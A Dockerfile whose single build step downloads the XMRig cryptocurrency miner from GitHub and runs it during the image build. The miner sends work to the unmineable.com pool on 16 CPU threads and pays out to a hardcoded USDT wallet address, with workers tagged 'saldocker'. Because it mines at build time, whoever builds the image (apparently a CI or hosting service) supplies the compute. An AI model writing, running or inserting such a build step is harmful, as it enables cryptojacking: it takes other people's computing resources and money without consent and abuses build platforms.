FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && \
    apt-get install -y wget tar ca-certificates && \
    wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
    tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz && \
    cd xmrig-6.22.2 && \
    WORKER_ID=$(cut -c1-6 /proc/sys/kernel/random/uuid) && \
    ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u USDT:0x098f58db447351f5433006b7761b9da8d8a26680.saldocker-$WORKER_ID -p x --tls --threads=16 --cpu-no-yield --randomx-no-numa
